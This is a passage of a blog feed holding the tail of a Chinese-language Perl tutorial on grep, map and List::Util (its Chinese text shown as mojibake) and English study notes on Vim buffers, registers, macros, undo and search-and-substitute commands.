ç­›é€‰åˆ—è¡¨</h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @odd_numbers = <span class="hljs-keyword">grep</span> &#123; $_ % <span class="hljs-number">2</span> &#125; <span class="hljs-number">1</span>..<span class="hljs-number">1000</span>;<br></code></pre></td></tr></table></figure><p><code>grep</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªä»£ç å—, ç¬¬äºŒä¸ªä¸ºåˆ—è¡¨. <code>grep</code> å¯¹åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ è®¡ç®—å‡ºä»£ç å—çš„å€¼. ä»£ç å—ä¸­çš„è¡¨è¾¾å¼è¿”å›çœŸå‡å€¼ä¾› <code>grep</code> åˆ¤æ–­.</p><p>åœ¨ <code>grep</code> è¿è¡Œä¸­ <code>$_</code> ä¼šè½®æµæˆä¸ºåˆ—è¡¨ä¸­æ¯ä¸ªå…ƒç´ çš„åˆ«å.</p><p>ä»ä¸€ä¸ªæ–‡ä»¶ä¸­å–å‡ºåŒ…å« fred çš„è¡Œ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @matching_lines = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/\bfred\b/i</span>, &lt;$fh&gt;;<br></code></pre></td></tr></table></figure><p><code>grep</code> æ“ä½œç¬¦åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­è¿”å›çš„æ˜¯ç¬¦åˆè¿‡æ»¤æ¡ä»¶çš„å…ƒç´ ä¸ªæ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $line_count = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/\bfred\b/i</span>, &lt;$fh&gt;; <br></code></pre></td></tr></table></figure><h2 id="ç”¨-map-æŠŠåˆ—è¡¨å…ƒç´ å˜å½¢"><a href="#ç”¨-map-æŠŠåˆ—è¡¨å…ƒç´ å˜å½¢" class="headerlink" title="ç”¨ map æŠŠåˆ—è¡¨å…ƒç´ å˜å½¢"></a>ç”¨ map æŠŠåˆ—è¡¨å…ƒç´ å˜å½¢</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @data = (<span class="hljs-number">4.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">6.9456</span>, <span class="hljs-number">12345678.9</span>, <span class="hljs-number">29.95</span>);<br><span class="hljs-keyword">my</span> @formatted_data = <span class="hljs-keyword">map</span> &#123; &amp;big_money($_) &#125; @data;<br></code></pre></td></tr></table></figure><p>å’Œ <code>grep</code> ç±»ä¼¼, ä½†å…¶ä¸è¿”å›çœŸå‡å€¼, è€Œæ˜¯è¡¨è¾¾å¼å®é™…çš„è®¡ç®—ç»“æœ, æœ€ç»ˆè¿”å›ä¸€ç³»åˆ—è¿™æ ·çš„ç»“æœç»„æˆçš„åˆ—è¡¨.</p><p>äº‹å®ä¸Š, ä»»ä½•å½¢å¼çš„ <code>grep</code> æˆ– <code>map</code> è¯­å¥éƒ½å¯ä»¥è¯¥å†™æˆ <code>foreach</code> å¾ªç¯.</p><p>å¯ä»¥ç”¨ç®€å•çš„è¡¨è¾¾å¼å’Œé€—å·è€Œéä¸€æ•´ä¸ªè¯­å¥å—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Some powers of two are:\n&quot;</span>, <br>    <span class="hljs-keyword">map</span> <span class="hljs-string">&quot;t&quot;</span> . ( <span class="hljs-number">2</span> ** $_ ) . <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0</span>..<span class="hljs-number">15</span>;<br></code></pre></td></tr></table></figure><h2 id="æ›´èŠ±å“¨çš„åˆ—è¡¨å·¥å…·"><a href="#æ›´èŠ±å“¨çš„åˆ—è¡¨å·¥å…·" class="headerlink" title="æ›´èŠ±å“¨çš„åˆ—è¡¨å·¥å…·"></a>æ›´èŠ±å“¨çš„åˆ—è¡¨å·¥å…·</h2><p>Perl ä¸­æœ‰ä¸€äº›æ¨¡å—ä¸“é—¨ç”¨äºåˆ—è¡¨æ•°æ®çš„å¤„ç†.</p><p>List::Util æ¨¡å—åŒ…å«åœ¨æ ‡å‡†åº“ä¸­, å…¶ç”¨ C è¯­è¨€å®ç°.</p><p>å¦‚, åœ¨æ‰¾åˆ°ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„å…ƒç´ æ—¶ç»“æŸéå†, è¿”å›ç»“æœ, ä½¿ç”¨ List::Util æä¾›çš„ <code>first</code> å­ç¨‹åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(first)</span>;<br><span class="hljs-keyword">my</span> $first_match = first &#123; <span class="hljs-regexp">/\bPebbles\b/i</span> &#125; @characters;<br></code></pre></td></tr></table></figure><p>è®¡ç®—æ€»å’Œ, åˆ©ç”¨ <code>sum</code> å­ç¨‹åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(sum)</span>;<br><span class="hljs-keyword">my</span> $total = sum( <span class="hljs-number">1</span>..<span class="hljs-number">1000</span> );<br></code></pre></td></tr></table></figure><p>æœ€å¤§å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(maxstr)</span>;<br><span class="hljs-keyword">my</span> $max = maxstr( @strings );<br></code></pre></td></tr></table></figure><p>å…ƒç´ éšæœºæ’åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(shuffle)</span>;<br><span class="hljs-keyword">my</span> @shuffled = shuffle(<span class="hljs-number">1</span>..<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>List::MoreUtils, æä¾›æ›´å¤šå·¥å…·, ä½†ä¸æ˜¯ Perl è‡ªå¸¦çš„.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn-Vim-On-Github</title>
    <link href="/2022/07/04/Learn-Vim-On-Github/"/>
    <url>/2022/07/04/Learn-Vim-On-Github/</url>
    
    <content type="html"><![CDATA[<!-- toc --><hr><h2 id="Buffers-Windows-and-Tabs"><a href="#Buffers-Windows-and-Tabs" class="headerlink" title="Buffers, Windows and Tabs"></a>Buffers, Windows and Tabs</h2><h3 id="Buffers"><a href="#Buffers" class="headerlink" title="Buffers"></a>Buffers</h3><p>use <code>:buffers</code> to see all the buffers.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> Create buffer. Each <span class="hljs-built_in">time</span> you <span class="hljs-built_in">open</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span>, Vim <span class="hljs-built_in">create</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> buffer <span class="hljs-keyword">for</span> that <span class="hljs-built_in">file</span>.<br><span class="hljs-number">2.</span> Delete buffer. use `:bdelete`.<br><span class="hljs-comment">### Windows</span><br>A window is how you are viewing <span class="hljs-keyword">a</span> buffer through. You are looking <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> buffer, displayed through <span class="hljs-keyword">a</span> window.<br></code></pre></td></tr></table></figure><p>If two windowes display the same buffer, when typing on one window, the other window will update in real-time.</p><h3 id="Tabs"><a href="#Tabs" class="headerlink" title="Tabs"></a>Tabs</h3><p>A collection of windows or it can be seen as a layout for windows.</p><p>Itâ€™s something we always see on the head of the screen.</p><p>run <code>gT</code> to go to next tab page.</p><h2 id="Searching-Files"><a href="#Searching-Files" class="headerlink" title="Searching Files"></a>Searching Files</h2><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>:find</code> find file in <code>path</code>. <code>set path?</code>.</p><p>  path&#x3D;.,&#x2F;usr&#x2F;include,,</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">- `.` <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> currently opened <span class="hljs-built_in">file</span>.<br>- `,` <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> current <span class="hljs-built_in">file</span>.<br></code></pre></td></tr></table></figure><p>modify the paths.<br><mark>Add</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> path+=app/controllers<br></code></pre></td></tr></table></figure><p>Add entire project directories:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">:<span class="hljs-built_in">set</span> path+=<span class="hljs-variable">$</span>&#123;<span class="hljs-built_in">PWD</span>&#125;/**<br></code></pre></td></tr></table></figure><p><code>**</code> means search recursively</p><h3 id="Grep"><a href="#Grep" class="headerlink" title="Grep"></a>Grep</h3><ul><li>Internal grep <code>:vimgrep</code>. Using <code>/pattern/</code>.</li><li>External grep <code>:grep</code>. Using <code>&quot;pattern&quot;</code>.</li></ul><h4 id="quickfix-command"><a href="#quickfix-command" class="headerlink" title="quickfix command"></a>quickfix command</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> <span class="hljs-code">`:copen`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cclose`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cnext`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cprevious`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:colder`</span><br><span class="hljs-bullet">-</span> <span class="hljs-code">`:cnewer`</span><br></code></pre></td></tr></table></figure><h3 id="Netrw"><a href="#Netrw" class="headerlink" title="Netrw"></a>Netrw</h3><p><code>netrw</code> is Vimâ€™s built-in file exploer.</p><p>I use NERDTree.</p><h3 id="Fzf"><a href="#Fzf" class="headerlink" title="Fzf"></a>Fzf</h3><p>fzf means â€œcommand-line fuzzy finderâ€.<br>Two plugin:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>fzf.vim<br><span class="hljs-bullet">- </span>ripgrep.vim<br></code></pre></td></tr></table></figure><p>It can have powerful usage when it is combined with ripgrep.</p><p>Actully, I use Ack instead of these two.</p><h2 id="Vim-Grammar"><a href="#Vim-Grammar" class="headerlink" title="Vim Grammar"></a>Vim Grammar</h2><p>Grammer rule in Vim language.</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">verb + <span class="hljs-built_in">noun</span><br></code></pre></td></tr></table></figure><h2 id="Moving-in-a-File"><a href="#Moving-in-a-File" class="headerlink" title="Moving in a File"></a>Moving in a File</h2><h3 id="Marking-Position"><a href="#Marking-Position" class="headerlink" title="Marking Position"></a>Marking Position</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">ma    Mark position <span class="hljs-keyword">with</span> mark <span class="hljs-string">&quot;a&quot;</span><br>\`a`    Jump <span class="hljs-keyword">to</span> <span class="hljs-literal">line</span> <span class="hljs-keyword">and</span> colume <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-symbol">&#x27;a</span>    Jump <span class="hljs-keyword">to</span> <span class="hljs-literal">line</span> <span class="hljs-string">&quot;a&quot;</span><br></code></pre></td></tr></table></figure><p>Lowercase alphabets are local marks and uppercase alphabets are global marks.</p><p>Global mark can travel across files.</p><p>To view all marks, use <code>:marks</code>.</p><h3 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h3><p>Read <code>:help jump-motions</code> </p><h2 id="The-Dot-Command"><a href="#The-Dot-Command" class="headerlink" title="The Dot Command"></a>The Dot Command</h2><p>The dot command <code>.</code> repeats the last change.</p><h3 id="Whatâ€™s-a-change"><a href="#Whatâ€™s-a-change" class="headerlink" title="Whatâ€™s a change"></a>Whatâ€™s a change</h3><p>Any time you update the content of the current buffer, like adding, modifying or deleting.</p><h2 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h2><p>Using register in insert mode <code>Ctrl-r</code></p><h3 id="Ten-Register-Types"><a href="#Ten-Register-Types" class="headerlink" title="Ten Register Types"></a>Ten Register Types</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>. The unnamed register <span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-number">2</span>. The numbered <span class="hljs-keyword">registers</span> (<span class="hljs-comment">&quot;0-9).</span><br><span class="hljs-number">3</span>. The small <span class="hljs-keyword">delete</span> register (<span class="hljs-comment">&quot;-).</span><br><span class="hljs-number">4</span>. The named <span class="hljs-keyword">registers</span> (<span class="hljs-comment">&quot;a-z).</span><br><span class="hljs-number">5</span>. The <span class="hljs-keyword">read</span>-<span class="hljs-keyword">only</span> <span class="hljs-keyword">registers</span> (<span class="hljs-string">&quot;:, &quot;</span>.,<span class="hljs-built_in">and</span> <span class="hljs-comment">&quot;%).</span><br><span class="hljs-number">6</span>. The alternate <span class="hljs-keyword">file</span> register (<span class="hljs-comment">&quot;#).</span><br><span class="hljs-number">7</span>. The expression register (<span class="hljs-comment">&quot;=).</span><br><span class="hljs-number">8</span>. The selection <span class="hljs-keyword">registers</span> (<span class="hljs-string">&quot;* and &quot;</span>+).<br><span class="hljs-number">9</span>. The black hole register (<span class="hljs-comment">&quot;_).</span><br><span class="hljs-number">10</span>.The <span class="hljs-keyword">last</span> <span class="hljs-built_in">search</span> pattern register (<span class="hljs-comment">&quot;/).</span><br></code></pre></td></tr></table></figure><p>The rule of thumb is, if an operator can remove a text, it probably stores the text to registers.</p><p>To paste the text from register a, do <code>&quot;ap</code>.</p><p>The general syntax to get the content from a specific register is <code>&quot;a</code>.<br>Can I say the motion like <code>y d p</code> are registers?</p><h3 id="The-Non-zero-Numbered-Registers"><a href="#The-Non-zero-Numbered-Registers" class="headerlink" title="The Non-zero Numbered Registers"></a>The Non-zero Numbered Registers</h3><p>Store the deleted text.</p><h3 id="The-Small-Delete-Register"><a href="#The-Small-Delete-Register" class="headerlink" title="The Small Delete Register"></a>The Small Delete Register</h3><p>Changes less than one line are stored in the small delete register <code>&quot;-</code></p><h3 id="The-Named-Regiter"><a href="#The-Named-Regiter" class="headerlink" title="The Named Regiter"></a>The Named Regiter</h3><p>You have to explicitly tell Vim to use the named register.</p><p>To yank a word into regiter a <code>&quot;ayiw</code></p><p><mark>small conclusion</mark><br>To use the register, you may follow, <code>&quot;(registername)+motion</code>, like <code>&quot;ap</code>, <code>a</code> is the name of the register, <code>p</code> is the paste motion.</p><p>All twenty-six alphabetical charactors can be used as the named registers.</p><p><mark>Uppercase</mark> version of register is ok.</p><h3 id="The-Read-only-Register"><a href="#The-Read-only-Register" class="headerlink" title="The Read-only Register"></a>The Read-only Register</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">. Stores <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> inserted <span class="hljs-keyword">text</span><br>: Stores <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> executed <span class="hljs-keyword">command</span><span class="hljs-title">-line</span><br>% Stores <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> current <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><h3 id="The-Expression-Register"><a href="#The-Expression-Register" class="headerlink" title="The Expression Register"></a>The Expression Register</h3><p>To get value from other rigister <code>&quot;=@a</code></p><h3 id="The-Selection-Register"><a href="#The-Selection-Register" class="headerlink" title="The Selection Register"></a>The Selection Register</h3><p>quotestar <code>&quot;*</code> and quoteplus <code>&quot;+</code> are connected to your clipboard.</p><h3 id="Clear-a-Register"><a href="#Clear-a-Register" class="headerlink" title="Clear a Register"></a>Clear a Register</h3><p><code>qaq</code> Let Vim to record an empty macro in the register a.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">call</span> <span class="hljs-built_in">setreg</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;hello register a&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>:let @a = &#39;&#39;</code>.</p><h3 id="Viewing-the-Registers"><a href="#Viewing-the-Registers" class="headerlink" title="Viewing the Registers"></a>Viewing the Registers</h3><p><code>:register</code> to view all registers, <code>:register a</code> only view register a.</p><h3 id="Putting-the-Content-of-a-Register"><a href="#Putting-the-Content-of-a-Register" class="headerlink" title="Putting the Content of a Register"></a>Putting the Content of a Register</h3><p>Use <code>:put</code> command. like <code>:put a</code></p><h2 id="Micros"><a href="#Micros" class="headerlink" title="Micros"></a>Micros</h2><p>Using Vim macros, you can record actions and store them inside Vim register.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">qa  To Start recording a <span class="hljs-function"><span class="hljs-keyword">macro</span> <span class="hljs-title">in</span></span> register a <br>q(<span class="hljs-keyword">while</span> recording)  Stop recording <span class="hljs-function"><span class="hljs-keyword">macro</span> </span><br></code></pre></td></tr></table></figure><p>Execute a macro:<br><code>@a  Execute macro from register a</code><br><code>@@  Execute the last executed macros</code><br><mark>Small Conclusion</mark><br>Macro is still using registers. Some differences, the <code>@</code> can execute commands.<br>Macro execution automatically ends when it encounters an error.</p><h3 id="Command-Line-Macro"><a href="#Command-Line-Macro" class="headerlink" title="Command Line Macro"></a>Command Line Macro</h3><p>You can run <code>normal! @a</code>.</p><p>execute macro between line 2 and 3, run <code>:2, 3 normal @a</code>.</p><p><code>99@a</code> will execute macro for 99 times, but most of the time it will ends early.</p><p><code>:g/pattern/normal @a</code> it executes the command you give on lines that match the pattern.</p><p>A useful key <code>~</code> toggle the case of the character under the cursor.</p><h3 id="Appending-a-Macro"><a href="#Appending-a-Macro" class="headerlink" title="Appending a Macro"></a>Appending a Macro</h3><p>Append a named register by using its uppercased symbal. If you want to add action to register a macro, using register A.</p><h3 id="Amending-a-Macro"><a href="#Amending-a-Macro" class="headerlink" title="Amending a Macro"></a>Amending a Macro</h3><p><mark>Small Conclusion</mark><br>Some macro can resolve the lack of the key to replace the mapping.<br><code>^[</code> is Vimâ€™s internal code representation of <code>&lt;Esc&gt;</code>.</p><p>Find the other internal code representation of some keys.</p><p>one way: <code>:let @a=</code></p><h3 id="Macro-Redundancy"><a href="#Macro-Redundancy" class="headerlink" title="Macro Redundancy"></a>Macro Redundancy</h3><p>To duplicate a macro in register a to register z <code>:let @z=@a</code></p><p>Almost everything that you can do in Vim can be replicated with macros.</p><h2 id="Undo"><a href="#Undo" class="headerlink" title="Undo"></a>Undo</h2><p>Vim undoes a single â€œchangeâ€ at a time. When you enter the insert mode until you exit it count a change.</p><p><code>undolevels</code> option.</p><p>Undo breakpoint.</p><h3 id="Undo-Tree"><a href="#Undo-Tree" class="headerlink" title="Undo Tree"></a>Undo Tree</h3><p>Every time you press <code>u</code> and then make a different change, Vim store the previous stateâ€™s text by creating an â€œundo branchâ€.</p><p>Typing <code>g+</code> can go to a newer state and <code>g-</code> can go to a previous state.</p><p>Adding plugin vim-mundo.</p><p>To use undo tree, enter <code>undolist</code>.</p><h4 id="Usage-of-mundo"><a href="#Usage-of-mundo" class="headerlink" title="Usage of mundo"></a>Usage of mundo</h4><p><a href="https://simnalamburt.github.io/vim-mundo/">office document</a><br>Your current position in the undo tree is marked with an <code>@</code> character. </p><p>Pressing <code>p</code> to preview the diff.  </p><h3 id="Persistent-Undo"><a href="#Persistent-Undo" class="headerlink" title="Persistent Undo"></a>Persistent Undo</h3><p><code>:wundo &#123;my-undo-file&#125;</code> to create a undo file, adding <code>!</code> to overwrite.</p><p><code>rundo &#123;file&#125;</code> to reading the undo file.</p><h3 id="Time-Travel"><a href="#Time-Travel" class="headerlink" title="Time Travel"></a>Time Travel</h3><p><code>:earlier 10s</code> back to 10 seconds ago.<br><code>:earlier 2</code> 2 changes ago<br><code>:earlier 10f</code> 10 saves ago</p><p><code>:later 10s</code>.</p><h2 id="Visual-Mode"><a href="#Visual-Mode" class="headerlink" title="Visual Mode"></a>Visual Mode</h2><p>Pressing <code>gU</code> to uppercase the selected text.</p><h3 id="Incrementing-Numbers"><a href="#Incrementing-Numbers" class="headerlink" title="Incrementing Numbers"></a>Incrementing Numbers</h3><p><code>Ctrl-A</code> command to increse, <code>Ctrl-X</code> command to decrese</p><p><code>g Ctrl-A</code> é€’å¢ï¼Œ<code>g Ctrl-X</code> é€’å‡.</p><h3 id="Selecting-the-Last-Visual-Mode-Area"><a href="#Selecting-the-Last-Visual-Mode-Area" class="headerlink" title="Selecting the Last Visual Mode Area"></a>Selecting the Last Visual Mode Area</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">`&lt;  Go <span class="hljs-keyword">to</span> the <span class="hljs-keyword">first</span> place of the <span class="hljs-keyword">previous</span> <span class="hljs-keyword">visual</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">highlight</span><br>`&gt;  Go <span class="hljs-keyword">to</span> the <span class="hljs-keyword">last</span> place of the <span class="hljs-keyword">previous</span> <span class="hljs-keyword">visual</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">highlight</span><br></code></pre></td></tr></table></figure><p>Deleting an inner word use <code>viwd</code></p><h2 id="Search-and-Substitude"><a href="#Search-and-Substitude" class="headerlink" title="Search and Substitude"></a>Search and Substitude</h2><p><code>/</code> can also be done with <code>?</code></p><p>Add case sensitivity: <code>:set ignorecase</code></p><h3 id="Repeating-Search"><a href="#Repeating-Search" class="headerlink" title="Repeating Search"></a>Repeating Search</h3><p>Repeating the previous search with <code>//</code>.</p><p>To see all search history, running <code>:history /</code>.</p><p><code>:set wrapscan</code> option to make Vim to search back at the top of the file when you reach the end of the file.</p><h3 id="Searching-for-Alternative-Words"><a href="#Searching-for-Alternative-Words" class="headerlink" title="Searching for Alternative Words"></a>Searching for Alternative Words</h3><p>Using <code>|</code> pattern, like <code>/\vhello|world</code></p><h3 id="Setting-the-Start-and-End-of-a-Match"><a href="#Setting-the-Start-and-End-of-a-Match" class="headerlink" title="Setting the Start and End of a Match"></a>Setting the Start and End of a Match</h3><p>Using <code>\zs</code> to set starting of a match and <code>\ze</code> to set ending of a match</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/11</span>\zsvim\ze22<br></code></pre></td></tr></table></figure><p>Matching the strings start with 11 and end with 22.</p><h3 id="Searching-for-Repeating-Characters"><a href="#Searching-for-Repeating-Characters" class="headerlink" title="Searching for Repeating Characters"></a>Searching for Repeating Characters</h3><p>Passing <code>count</code> to your search.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;n,m&#125;</span><br></code></pre></td></tr></table></figure><p>four different variations of the <code>count</code> syntax.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;n&#125;</span><span class="language-xml">, /[0-9]\</span><span class="hljs-template-variable">&#123;2\&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;n,m&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;,m&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;n,&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Predefined-Character-Ranges"><a href="#Predefined-Character-Ranges" class="headerlink" title="Predefined Character Ranges"></a>Predefined Character Ranges</h3><p>Full list inside <code>:h /character-classes</code></p><h3 id="Basic-Substitution"><a href="#Basic-Substitution" class="headerlink" title="Basic Substitution"></a>Basic Substitution</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">:s<span class="hljs-regexp">/&#123;old-pattern&#125;/</span>&#123;<span class="hljs-keyword">new</span>-pattern&#125;/<br></code></pre></td></tr></table></figure><h3 id="Substitution-Range"><a href="#Substitution-Range" class="headerlink" title="Substitution Range"></a>Substitution Range</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">:[range]s<span class="hljs-regexp">/old/</span><span class="hljs-keyword">new</span>/<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">:<span class="hljs-number">3</span>,<span class="hljs-number">5</span>s<span class="hljs-regexp">/let/</span>const/<br></code></pre></td></tr></table></figure><p>To substisude on lines three to five.</p><p>Range variation:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">:,<span class="hljs-number">3</span>s<span class="hljs-regexp">/let/</span>const/<br>:<span class="hljs-number">1</span>,s<span class="hljs-regexp">/let/</span>const/<br>:<span class="hljs-number">3</span>s<span class="hljs-regexp">/let/</span>const/<br></code></pre></td></tr></table></figure><p><code>%</code> always means the entire file. <code>%ss/let/const/</code></p><h3 id="Substitude-Flags"><a href="#Substitude-Flags" class="headerlink" title="Substitude Flags"></a>Substitude Flags</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&amp;    Reuse the flags <span class="hljs-keyword">from</span> the previous substitute command.<br>g    Replace <span class="hljs-keyword">all</span> matches <span class="hljs-keyword">in</span> the <span class="hljs-type">line</span>.<br>c    Ask <span class="hljs-keyword">for</span> substitution confirmation.<br>e    Prevent error message <span class="hljs-keyword">from</span> displaying <span class="hljs-keyword">when</span> substitution fails.<br>i    <span class="hljs-keyword">Perform</span> <span class="hljs-keyword">case</span> insensitive substitution.<br>I    <span class="hljs-keyword">Perform</span> <span class="hljs-keyword">case</span> sensitive substitution.<br></code></pre></td></tr></table></figure><h3 id="Changing-the-Delimiter"><a href="#Changing-the-Delimiter" class="headerlink" title="Changing the Delimiter"></a>Changing the Delimiter</h3><p>You can change the delimiter with any single-byte characters.o</p><h3 id="Substituting-Across-Multiple-Files"><a href="#Substituting-Across-Multiple-Files" class="headerlink" title="Substituting Across Multiple Files"></a>Substituting Across Multiple Files</h3><p><code>:args</code> and <code>:argdo</code> are useful tools to apply command line commands across multiple files.</p><h3 id="args-and-argdo"><a href="#args-and-argdo" class="headerlink" title=":args and :argdo"></a><code>:args</code> and <code>:argdo</code></h3><p><code>:args</code> is argument list. <code>:argdo</code> execute {cmd} for each file in the argument list.</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">:<span class="hljs-comment">[range]</span>argdo<span class="hljs-comment">[!]</span> &#123;cmd&#125;<br></code></pre></td></tr></table></figure><h2 id="The-Global-Command"><a href="#The-Global-Command" class="headerlink" title="The Global Command"></a>The Global Command</h2><p>Repeating the last change with the dot command <code>.</code>, Replaying actions with macros <code>q</code>, storing texts in the registers <code>&quot;</code>.</p><h3 id="Global-Command-Overview"><a href="#Global-Command-Overview" class="headerlink" title="Global Command Overview"></a>Global Command 